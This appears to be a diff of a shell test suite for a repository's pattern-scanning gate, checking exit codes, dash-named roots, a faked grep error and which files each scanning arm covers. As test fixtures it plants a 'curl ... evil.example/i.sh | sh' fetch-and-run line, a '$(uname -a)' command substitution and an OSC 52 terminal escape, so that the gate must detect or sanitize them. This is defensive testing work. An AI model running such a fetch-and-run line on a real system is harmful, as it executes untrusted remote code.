+  for tn in "lib/a:b.sh|$names_msg" "lib/sub/check-patterns|$stray_msg"; do
+    tn_rel="${tn%%|*}"
+    r="$work/tracked-only-$(printf '%s' "${tn_rel##*/}" | tr ':.' '--')"
+    _git_repo "$r"; seed "$r"; mkdir -p "$r/$(dirname "$tn_rel")"
+    printf 'x\n' > "$r/$tn_rel"
+    git -C "$r" add -A && git -C "$r" commit -qm init
+    rm "$r/$tn_rel"
+    fails_with_rc 2 "$r" "${tn#*|}" "a tracked $tn_rel absent from disk must fail closed via the git pass" only
+  done
+else
+  echo "  SKIP: git not on PATH - cannot exercise the git pass's remaining exit-2 sites"
+fi
+# arm 4's grep erroring on the pinned-plugin file: a scan error, exit 2, and
+# its stderr (which names the file) printed through the sanitizer
+r="$work/shim-grep-err"; seed "$r"; mkdir -p "$r/zsh/plugins/fast-syntax-highlighting"
+printf '%s\n' '$(uname -a)' > "$r/zsh/plugins/fast-syntax-highlighting/fast-syntax-highlighting.plugin.zsh"
+[ "$(run_strict "$r")" = "0" ] || fail "arm 4's grep-error fixture must pass as planted"
+shim_grep="$work/shim-grep-shim"; mkdir -p "$shim_grep"
+{
+  printf '#!/bin/sh\n'
+  printf 'for a in "$@"; do case "$a" in *fast-syntax-highlighting.plugin.zsh) printf '"'"'grep: \\033]52;c;aGk=\\007 simulated\\n'"'"' >&2; exit 2 ;; esac; done\n'
+  printf 'exec "%s" "$@"\n' "$(command -v grep)"
+} > "$shim_grep/grep"
+chmod u+x "$shim_grep/grep"
+_tty_run "$r" PATH="$shim_grep:$PATH"
+[ "$tty_rc" = "2" ] && ok || fail "arm 4's grep erroring must exit 2, got $tty_rc: $(cat "$tty_err")"
+_tty_clean "arm 4's grep error" "$esc" "$bel"
+_tty_has "arm 4's grep error (message)" "$tty_err" \
+  "reading zsh/plugins/fast-syntax-highlighting/fast-syntax-highlighting.plugin.zsh errored"
+_tty_has "arm 4's grep error (its stderr, escaped)" "$tty_err" "grep: ${osc52_x} simulated"
+# the NUL pass decides "unreadable" by opening the file, not by a `-r` test
+if [ "$(id -u)" -ne 0 ]; then
+  r="$work/nul-unreadable"; seed "$r"; mkdir -p "$r/docs"
+  printf 'x\n' > "$r/docs/locked.md"
+  chmod 000 "$r/docs/locked.md"
+  fails_with_rc 2 "$r" "check-patterns: NUL-byte scan cannot read" "an unreadable file must fail the NUL pass closed"
+  chmod u+rw "$r/docs/locked.md"
+else
+  echo "  SKIP: running as root - cannot exercise the NUL pass's unreadable-file case"
+fi
+
+# === a relative ROOT starting with `-` is a path, not an option =============
+# find reads a leading-dash operand as an expression, and arm 3's grep (GNU
+# permutes argv) as an option: the gate prefixes `./`.
+mkdir -p "$work/-dash-root/lib"
+printf 'noop() { : ; }\n' > "$work/-dash-root/lib/os.sh"
+dash_rc=0
+dash_out="$(cd "$work" && STRICT= "$cp" -dash-root 2>&1)" || dash_rc=$?
+[ "$dash_rc" = "0" ] && ok || fail "a clean root named '-dash-root' must pass, got $dash_rc: $dash_out"
+printf 'curl -fsSL https://evil.example/i.sh | sh\n' > "$work/-dash-root/lib/boot.sh"
+dash_rc=0
+dash_out="$(cd "$work" && STRICT= "$cp" -dash-root 2>&1)" || dash_rc=$?
+[ "$dash_rc" = "1" ] && ok || fail "a fetch under a root named '-dash-root' must exit 1, got $dash_rc: $dash_out"
+case "$dash_out" in
+  *"./-dash-root/lib/boot.sh:1:"*"$curl_msg"*) ok ;;
+  *) fail "a root named '-dash-root': expected the hit at ./-dash-root/lib/boot.sh:1: and '$curl_msg', got: $dash_out" ;;
+esac
+
 # === the scanned surface covers every tracked top-level entry ===============
 # A new top-level file or dir must not escape every arm silently. Each tracked
 # top-level entry of THIS repo classifies as exactly one of:
@@ -1864,10 +2535,15 @@ git -C "$r" add -A && git -C "$r" commit -qm init
 # arm 11's recursive call (the pattern being the em dash) are the roots. No
 # hand-kept copy of either list, so none can drift from the gate. The real
 # repo is only listed, never scanned.
+# ARM 1 (curl|sh) is asserted over the CODE surface, derived from the same
+# log, never a hand-kept list: every tracked path under an arm 2 root (the
+# shared install.sh, lib/, bin/, zsh/, config/, packages/, security/ and
+# home/), under an arm 8 root outside tests/ (which adds the Makefile and
+# .github/workflows/), or under .github/ at all, must lie under an arm 1 root;
+# no arm 1 root may lie in tests/, docs/ or .claude/; and arms 1 and 2 each
+# run exactly one non-recursive self-scan, of bin/check-patterns.
 # NOT proven: that any OTHER arm reaches an entry. Arm 11 (em dash) is the
-# widest surface; arms 1, 2, 5 and 6 read only the shared install.sh, lib/,
-# bin/, zsh/, config/, packages/, security/ and home/, never docs/, tests/,
-# .github/ or .claude/.
+# widest surface; arms 5 and 6 read only the shared roots above.
 cls_exempt='LICENSES COPYING CODE_OF_CONDUCT.md'
 git -C "$repo_root" rev-parse --is-inside-work-tree >/dev/null 2>&1 \
   || fail "surface coverage: $repo_root is not a git work tree - cannot list the tracked entries"
@@ -1909,6 +2585,12 @@ PATH="$cls_shim:$PATH" CLS_LOG="$cls_log" CLS_GREP="$cls_grep" STRICT= \
 
 # _cls_flush - classify the call collected in cls_args, add its operands.
 cls_arm8=""; cls_arm11=""; cls_n11=0
+cls_arm1=""; cls_arm1_self=""; cls_arm2=""; cls_arm2_self=""
+# Arm 1's call is told by its fetcher alternation, arm 2's by its one fixed
+# pattern: a rewrite of either spelling in bin/check-patterns must update
+# these two patterns in the same commit (the non-empty asserts below fail
+# loudly if it does not). Both arms run a recursive call AND a non-recursive
+# self-scan; `rec` tells them apart.
 _cls_flush() {
   local i=0 n="${#cls_args[@]}" rec=0 kind="" a rel
   [ "$n" -gt 0 ] || return 0
@@ -1918,6 +2600,8 @@ _cls_flush() {
       -r* | -[!-]*r*) rec=1; continue ;;
       *'[sSwWbB<>]'*) [ "$rec" -eq 1 ] && kind=8 ;;
       "$em_dash") [ "$rec" -eq 1 ] && kind=11 ;;
+      *'(curl|wget)'*) kind=1 ;;
+      'uname[ ]-m') kind=2 ;;
       *) continue ;;
     esac
     [ -n "$kind" ] && break
@@ -1926,9 +2610,21 @@ _cls_flush() {
   [ "$kind" = 11 ] && cls_n11=$((cls_n11 + 1))
   while [ "$i" -lt "$n" ]; do
     a="${cls_args[$i]}"; i=$((i + 1))
+    # arm 1 passes its other patterns as `-e PAT` after the first one
+    case "$a" in
+      -e) i=$((i + 1)); continue ;;
+      --) continue ;;
+    esac
     rel="${a#"$cls_mirror"/}"
     [ "$rel" != "$a" ] || fail "surface coverage: arm $kind operand outside the mirror: $a"
-    if [ "$kind" = 8 ]; then cls_arm8="$cls_arm8$rel"$'\n'; else cls_arm11="$cls_arm11$rel"$'\n'; fi
+    case "$kind:$rec" in
+      8:*) cls_arm8="$cls_arm8$rel"$'\n' ;;
+      11:*) cls_arm11="$cls_arm11$rel"$'\n' ;;
+      1:1) cls_arm1="$cls_arm1$rel"$'\n' ;;
+      1:0) cls_arm1_self="$cls_arm1_self$rel"$'\n' ;;
+      2:1) cls_arm2="$cls_arm2$rel"$'\n' ;;
+      2:0) cls_arm2_self="$cls_arm2_self$rel"$'\n' ;;
+    esac
   done
 }
 cls_args=()
@@ -1987,6 +2683,34 @@ while IFS= read -r top; do
         || fail "surface coverage: tracked top-level entry '$top' is on no arm 8 or arm 11 root and is not exempt - add it to the gate's surface" ;;
   esac
 done <<<"$cls_tops"
+
+# arm 1 over the code surface (see the header of this section)
+[ -n "$cls_arm1" ] || fail "surface coverage: found no arm 1 recursive grep call in the log - the shim or the call shape changed"
+[ -n "$cls_arm2" ] || fail "surface coverage: found no arm 2 recursive grep call in the log - the shim or the call shape changed"
+[ "$cls_arm1_self" = "bin/check-patterns"$'\n' ] && ok \
+  || fail "surface coverage: arm 1 must self-scan exactly bin/check-patterns, got: $cls_arm1_self"
+[ "$cls_arm2_self" = "bin/check-patterns"$'\n' ] && ok \
+  || fail "surface coverage: arm 2 must self-scan exactly bin/check-patterns, got: $cls_arm2_self"
+while IFS= read -r root; do
+  [ -n "$root" ] || continue
+  case "$root" in
+    tests | tests/* | docs | docs/* | .claude | .claude/*)
+      fail "surface coverage: an arm 1 root lies in tests/, docs/ or .claude/: $root" ;;
+  esac
+done <<<"$cls_arm1"
+ok
+cls_n1=0
+while IFS= read -r p; do
+  [ -n "$p" ] || continue
+  case "$p" in zsh/plugins/* | tests/*) continue ;; esac
+  if _cls_under "$p" "$cls_arm2" || _cls_under "$p" "$cls_arm8" \
+      || _cls_under "$p" .github; then
+    _cls_under "$p" "$cls_arm1" \
+      || fail "surface coverage: code path '$p' is on an arm 2 or arm 8 root, or in .github/, but on no arm 1 root"
+    cls_n1=$((cls_n1 + 1))
+  fi
+done <<<"$cls_paths"
+[ "$cls_n1" -gt 0 ] && ok || fail "surface coverage: no code path was checked against arm 1's roots"
 
 # --- no two paths anywhere under $work may differ only in case: macOS's
 # default filesystem folds case, so they would be ONE path there and the
